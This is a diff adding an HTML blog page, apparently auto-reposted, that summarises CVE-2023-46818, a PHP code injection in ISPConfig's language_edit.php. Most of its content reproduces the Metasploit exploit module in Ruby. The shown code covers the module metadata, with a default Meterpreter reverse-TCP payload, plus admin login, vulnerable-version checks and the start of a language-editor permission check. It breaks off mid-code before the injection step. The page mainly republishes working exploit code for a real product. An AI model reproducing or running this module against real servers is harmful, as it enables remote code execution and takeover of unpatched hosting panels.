@@ -1,0 +1,666 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lianccc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞信息漏洞名称： ISPConfig language_edit.php PHP代码注入 漏洞编号：  CVE： CVE-2023-46818  漏洞类型： 代码注入 漏洞等级： 高危 漏洞描述： ISPConfig的language_edit.php文件存在PHP代码注入漏洞。当admin_allow_langedit设置启用时，经过身份验证的管理员可以通过语言编辑器界面注入任意PHP代码。该">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISPConfig language_editphp PHP代码注入">
+<meta property="og:url" content="http://example.com/2025/06/30/github_938639146/index.html">
+<meta property="og:site_name" content="liancc&#39; infos blog">
+<meta property="og:description" content="漏洞信息漏洞名称： ISPConfig language_edit.php PHP代码注入 漏洞编号：  CVE： CVE-2023-46818  漏洞类型： 代码注入 漏洞等级： 高危 漏洞描述： ISPConfig的language_edit.php文件存在PHP代码注入漏洞。当admin_allow_langedit设置启用时，经过身份验证的管理员可以通过语言编辑器界面注入任意PHP代码。该">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-06-30T15:45:21.338Z">
+<meta property="article:modified_time" content="2025-06-30T15:45:21.333Z">
+<meta property="article:author" content="lianccc">
+<meta property="article:tag" content="rapid7&#x2F;metasploit-framework:github issues">
+<meta property="article:tag" content="代码注入">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>ISPConfig language_editphp PHP代码注入 - liancc&#39; infos blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="liancc' infos blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Craw Info</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ISPConfig language_editphp PHP代码注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-30 15:45" pubdate>
+          2025年6月30日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ISPConfig language_editphp PHP代码注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入</p>
+<p><strong>漏洞编号：</strong></p>
+<ul>
+<li><strong>CVE：</strong> CVE-2023-46818</li>
+</ul>
+<p><strong>漏洞类型：</strong> 代码注入</p>
+<p><strong>漏洞等级：</strong> 高危</p>
+<p><strong>漏洞描述：</strong> ISPConfig的language_edit.php文件存在PHP代码注入漏洞。当<code>admin_allow_langedit</code>设置启用时，经过身份验证的管理员可以通过语言编辑器界面注入任意PHP代码。该模块会自动检查<code>admin_allow_langedit</code>权限是否启用，并尝试启用它（需要具有系统配置访问权限的管理员凭据）。漏洞利用通过将PHP有效负载注入语言文件，然后在访问该文件时执行。有效负载使用PHP的file_put_contents函数进行base64编码并写入。</p>
+<p><strong>产品厂商：</strong> ISPConfig</p>
+<p><strong>产品名称：</strong> ISPConfig</p>
+<p><strong>影响版本：</strong> version &lt; 3.2.11p1</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/47f2ba2861e1f8d14f7e2e2378d1a55052381dc2/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/47f2ba2861e1f8d14f7e2e2378d1a55052381dc2/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p>
+<p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p>
+<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">prepend</span> <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Remote</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:AutoCheck</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Remote::HttpClient</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          This module exploits a PHP code injection vulnerability in ISPConfig&#x27;s</span><br><span class="hljs-string">          language_edit.php file. The vulnerability occurs when the `admin_allow_langedit`</span><br><span class="hljs-string">          setting is enabled, allowing authenticated administrators to inject arbitrary</span><br><span class="hljs-string">          PHP code through the language editor interface.</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          This module will automatically check if the required `admin_allow_langedit`</span><br><span class="hljs-string">          permission is enabled, and attempt to enable it if it&#x27;s disabled (requires</span><br><span class="hljs-string">          admin credentials with system configuration access).</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          The exploit works by injecting a PHP payload into a language file, which</span><br><span class="hljs-string">          is then executed when the file is accessed. The payload is base64 encoded</span><br><span class="hljs-string">          and written using PHP&#x27;s file_put_contents function.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span>, <span class="hljs-comment"># Discovery and PoC</span><br>          <span class="hljs-string">&#x27;Egidio Romano&#x27;</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_PHP</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_PHP</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    <span class="hljs-comment"># Always try to log in and parse version, since credentials are required</span><br>    <span class="hljs-comment"># Clear any existing cookies before login</span><br>    cookie_jar.clear<br>    <br>    login_res = send_request_cgi!(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login/&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> login_res &amp;&amp; (login_res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>]&amp;.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;admin&#x27;</span>) |<span class="hljs-params"></span>| login_res.body.downcase.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;dashboard&#x27;</span>))<br>      <span class="hljs-comment"># Try to access the dashboard or settings page</span><br>      settings_res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;help&#x27;</span>, <span class="hljs-string">&#x27;version.php&#x27;</span>),<br>        <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>      &#125;)<br>      <span class="hljs-keyword">if</span> settings_res<br>        doc = settings_res.get_html_document<br>        <span class="hljs-comment"># Try to find version in a span, div, or similar element</span><br>        version_element = doc.at(<span class="hljs-string">&#x27;//p[@class=&quot;frmTextHead&quot;]&#x27;</span>)<br>        <span class="hljs-keyword">if</span> version_element<br>          version_text = version_element.text<br>          version = version_text.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>].gsub(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>          version = <span class="hljs-title class_">Rex::Version</span>.new(version)<br>          <span class="hljs-keyword">if</span> version &lt; <span class="hljs-title class_">Rex::Version</span>.new(<span class="hljs-string">&#x27;3.2.11p1&#x27;</span>)<br>            print_good(<span class="hljs-string">&quot;ISPConfig version detected: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Vulnerable</span>(<span class="hljs-string">&quot;Version: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>          <span class="hljs-keyword">end</span><br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">authenticate</span><br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">302</span><br>      res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>         <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login/&#x27;</span>,res&amp;.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,<span class="hljs-literal">nil</span>))<br>      &#125;)<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">if</span> res.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,<span class="hljs-literal">nil</span>)&amp;.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;admin&#x27;</span>) |<span class="hljs-params"></span>|<br>       res.body.downcase.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">end</span><br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_langedit_permission</span><br>    print_status(<span class="hljs-string">&#x27;Checking if admin_allow_langedit is enabled...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Try to access the language editor to see if it&#x27;s accessible</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">if</span> 